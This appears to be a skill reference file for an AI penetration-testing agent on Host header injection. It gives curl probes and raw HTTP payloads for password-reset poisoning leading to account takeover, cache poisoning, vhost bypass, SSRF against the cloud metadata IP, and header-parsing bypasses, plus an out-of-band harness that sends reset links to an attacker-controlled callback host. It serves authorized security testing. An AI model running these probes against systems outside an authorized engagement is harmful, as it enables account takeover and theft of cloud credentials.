---
name: Host Header Injection
description: Reference for Host header injection covering password-reset poisoning, cache key abuse, virtual-host routing bypass, X-Forwarded-Host trust, and absolute-URL construction gaps.
---

# Host Header Injection

Reference for finding bugs where the server uses `Host`, `X-Forwarded-Host`, or related headers to construct absolute URLs, route requests, build security tokens, or key caches. Pull this in when you suspect password-reset, OAuth, or cache flows are reading attacker-controllable host values.

> Black-box scope: probes drive HTTP and observe response-body / redirect / email payloads. Causality is established with paired requests (poisoned vs canonical Host).

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Single probe with custom Host | `execute_curl -i` | `Host` and `X-Forwarded-Host` set independently. |
| Trigger password-reset / signup flows | `execute_playwright` | Often easier than curl when CSRF tokens are required. |
| Capture OOB callbacks for reset-link leaks | `kali_shell interactsh-client` | Use as the attacker host. |
| Header sweep | `execute_code` | Iterate header candidates over the same path. |

## Header inventory

The headers an app might trust to determine "what is my hostname?":

```
Host:                       <- canonical, always present
X-Forwarded-Host:           <- common reverse-proxy header
X-Original-Host:
X-Host:
X-HTTP-Host-Override:
X-Forwarded-Server:
X-Forwarded-Port:
X-Forwarded-Proto:
X-Forwarded-Scheme:
X-Forwarded-Path:
Forwarded:                  <- RFC 7239 (Forwarded: host=...; proto=...)
X-Real-IP:                  <- IP, not host, but sometimes trusted for routing
True-Client-IP:
X-Cluster-Client-IP:
```

The canonical bug: server reads `X-Forwarded-Host` (or constructs absolute URLs from `Host`) and the upstream proxy doesn't strip / validate the attacker-supplied value.

## Reconnaissance

### Identify host-dependent behavior

| Probe | Looking for |
|---|---|
| `Host: target.tld` (baseline) | Canonical response |
| `Host: attacker.tld` (override) | Server may 400 / 421 (Misdirected Request) -> hardened. May 200 with attacker.tld in body -> finding. |
| `X-Forwarded-Host: attacker.tld` | Same observation, different header |
| Trigger password reset, observe email | Reset link domain (`https://target.tld/reset?token=...`) |
| Trigger email confirmation | Same |
| Inspect canonical / OG meta tags | `<link rel="canonical" href="https://...">` |
| 302 redirect targets | `Location: https://...` absolute URLs |

```
execute_curl url: "https://target.tld/login" headers: "Host: attacker.tld" -i
execute_curl url: "https://target.tld/login" headers: "X-Forwarded-Host: attacker.tld" -i
execute_curl url: "https://target.tld/" headers: "Host: target.tld\nX-Forwarded-Host: attacker.tld" -i
```

Inspect response body for:

```
"https://attacker.tld/..." in any anchor / script / link tag
canonical link rel
absolute redirects
Set-Cookie Domain= attribute
```

### Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive this from the recorded history (proxy_brain only see traffic that crossed the capture proxy).

- `redamon.replay id mutate:{headers:{"X-Forwarded-Host":"attacker.tld"}}` resends a captured request with a mutated `X-Forwarded-Host` / `X-Original-Host` / `Forwarded` and inspects the reflected host in the body, `Location`, and `Set-Cookie Domain=`. The raw `Host` is pinned to the origin, but `X-Forwarded-Host` (the more-trusted header) is fully mutable.
- `redamon.diff id_canonical id_poisoned` pairs a clean replay against the poisoned one so the reflected host stands out.
- `redamon.grep "attacker.tld"` confirms the injected host actually landed in a captured response body.
- `redamon.search` / `redamon.sitemap` surface the password-reset, signup, and redirect endpoints worth replaying.

## Attack matrix

### 1. Password reset poisoning (the canonical bug)

```
1. Attacker triggers a password reset for victim@target.tld with header:
     X-Forwarded-Host: attacker.tld
2. Server constructs the reset link:
     https://attacker.tld/reset?token=<secret>
3. Email goes to victim@target.tld with the poisoned link.
4. Victim clicks; their browser sends the reset token to attacker.tld.
5. Attacker uses the token at the legitimate https://target.tld/reset?token=<secret> -> ATO.
```

Probe (without burning a real account):

```
execute_curl url: "https://target.tld/api/forgot-password" method: "POST" headers: "Content-Type: application/json\nX-Forwarded-Host: attacker.tld" data: '{"email":"victim@target.tld"}'
```

Then read the email (when the engagement allows test-account access). The reset link should not contain `attacker.tld`.

### 2. Cache poisoning via Host

When the cache key omits the Host but the response contains the host:

```
GET / HTTP/1.1
Host: target.tld
X-Forwarded-Host: attacker.tld

-> Response includes <link rel="canonical" href="https://attacker.tld/">
   Cache stores under (method=GET, path=/) only
   Subsequent victim requests (without X-Forwarded-Host) receive the poisoned response
```

See `/skill web_cache_poisoning` for the full sweep.

### 3. Routing / virtual-host bypass

```
Host: internal-admin.target.tld
Host: localhost
Host: 127.0.0.1
```

Some reverse proxies route based on `Host`. An attacker-supplied Host can reach internal vhosts that are not exposed externally. Combine with `X-Forwarded-For: 127.0.0.1` for a complete IP+host spoof.

### 4. SSRF via absolute URL construction

Server-side webhooks / link-unfurlers / image proxies that construct an absolute URL from the request:

```
GET /image?path=/uploads/x.png HTTP/1.1
Host: 169.254.169.254

-> Server fetches https://169.254.169.254/uploads/x.png
   = AWS metadata IP
   = SSRF
```

Probe:

```
execute_curl url: "https://target.tld/preview?path=/latest/meta-data/" headers: "Host: 169.254.169.254"
```

### 5. Email / link-rewrite poisoning

Apps that whitelist link-clickability based on `Host` (e.g. for tracking) may accept any Host and emit emails with attacker-domain tracking links.

### 6. JWT issuer / audience binding

Some apps build JWT `iss` from `Host`. An attacker-controlled Host produces a token with `iss=https://attacker.tld/` that downstream services then trust.

```
execute_curl url: "https://target.tld/api/login" method: "POST" headers: "Host: attacker.tld\nContent-Type: application/json" data: '{"u":"alice","p":"pass"}'
# Decode the returned token; if iss reflects attacker.tld, pivot to /skill jwt_attacks.
```

### 7. CORS allowlist via Host

When the CORS allowlist is built from the request's Host (rare but real), the same attacker-Host value reflects into ACAO:

```
GET /api/me HTTP/1.1
Host: attacker.tld
Origin: https://attacker.tld

-> ACAO: https://attacker.tld + ACAC: true
```

Pair with `/skill cors_misconfig`.

### 8. Set-Cookie Domain

Cookies set with `Domain=` from a poisoned Host can be scoped to attacker.tld:

```
Set-Cookie: session=...; Domain=attacker.tld; Path=/
```

Browsers reject mismatched-domain cookies, so this often becomes a "drop the cookie entirely" symptom rather than an exfil channel. Still file as a finding.

## Bypass techniques

### Multiple Host headers

```
GET / HTTP/1.1
Host: target.tld
Host: attacker.tld
```

Some proxies use the first, the app uses the last (or vice versa). Test all combinations.

### Absolute-URI request-line

```
GET https://attacker.tld/path HTTP/1.1
Host: target.tld
```

The HTTP/1.1 spec allows absolute URIs in the request line. Some servers prefer the URI's host over the Host header.

### Indented Host

```
GET / HTTP/1.1
 Host: target.tld
Host: attacker.tld
```

Folded continuation may confuse the proxy / origin parser pair.

### Line endings

```
Host: target.tld\nHost: attacker.tld
Host: target.tld\rHost: attacker.tld
```

CRLF / CR-only injection in the Host value (paired with `/skill crlf_injection`).

### Port-based bypass

```
Host: target.tld:80@attacker.tld
Host: target.tld#attacker.tld
Host: target.tld:80\r\nX-Pwn: 1
```

Some parsers strip after `:`, `#`, or whitespace; the trailing portion still reaches downstream code.

## OOB confirmation harness

```
kali_shell: interactsh-client -v -o /tmp/oast.log &
execute_curl url: "https://target.tld/api/forgot-password" method: "POST" headers: "Content-Type: application/json\nX-Forwarded-Host: <oast-id>.oast.fun" data: '{"email":"alice@target.tld"}'
# wait, then read /tmp/oast.log for the email-rendering callback
```

If the email service or worker fetches the reset URL (some apps prefetch links for safety scanning), the interactsh log captures the request and proves the host is server-trusted.

## Validation shape

A clean Host-header finding includes:

1. The exact request with the attacker Host / X-Forwarded-Host.
2. The response showing the reflected host (in body, redirect, set-cookie, or downstream artifact).
3. For password-reset / email flows: the email body containing the poisoned link (test-account authority required).
4. For cache poisoning: paired requests (with and without the header) showing the poisoned cached response.
5. For SSRF: the metadata response or interactsh callback proving the internal fetch.

## False positives

- `Host` validation rejects mismatched values with 400 / 421 before reaching the application.
- Reverse proxy strips `X-Forwarded-Host` and rebuilds it from the canonical Host.
- Application uses an env-var hostname (`SERVER_NAME`) and ignores all request headers.
- Reflected-but-not-trusted: attacker Host appears in error pages but does not influence security decisions or outbound emails.
- Email service uses static domain templates regardless of incoming Host.

## Hand-off

```
Reset poisoning -> ATO              -> built-in brute_force_credential_guess (downstream); also /skill oauth_oidc
Cache poisoning                      -> /skill web_cache_poisoning
SSRF chain                           -> built-in ssrf_exploitation skill
JWT iss poisoning                    -> /skill jwt_attacks
CORS via Host                        -> /skill cors_misconfig
CRLF in Host                         -> /skill crlf_injection
Open redirect chain                  -> /skill open_redirect
```

## Pro tips

- `X-Forwarded-Host` is more often trusted than `Host` because reverse-proxy stacks default to forwarding it.
- Always test at least three header positions: `Host`, `X-Forwarded-Host`, both. Some apps cross-check.
- Email-bound flows are the highest impact: a reset link points where Host says.
- Some proxies (Cloudflare) strip `X-Forwarded-Host` on inbound. Test from inside the trust boundary if available.
- Multi-Host duplicate headers exploit parser differentials between the proxy and origin.
- For SSRF chains, IP-style Hosts (`Host: 169.254.169.254`) often reach the inner fetcher when the outer proxy doesn't sanity-check.
